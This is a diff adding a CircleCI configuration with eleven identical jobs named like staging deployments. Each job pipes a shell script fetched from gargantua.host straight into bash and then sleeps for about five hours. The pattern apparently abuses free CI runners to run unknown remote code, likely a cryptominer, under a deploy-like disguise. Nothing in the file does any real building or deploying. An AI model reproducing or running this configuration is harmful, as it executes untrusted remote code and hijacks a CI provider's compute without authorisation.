@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  darstagingdpl:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  darstagingdpl10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - darstagingdpl
+      - darstagingdpl1
+      - darstagingdpl2
+      - darstagingdpl3
+      - darstagingdpl4
+      - darstagingdpl5
+      - darstagingdpl6
+      - darstagingdpl7
+      - darstagingdpl8
+      - darstagingdpl9
+      - darstagingdpl10
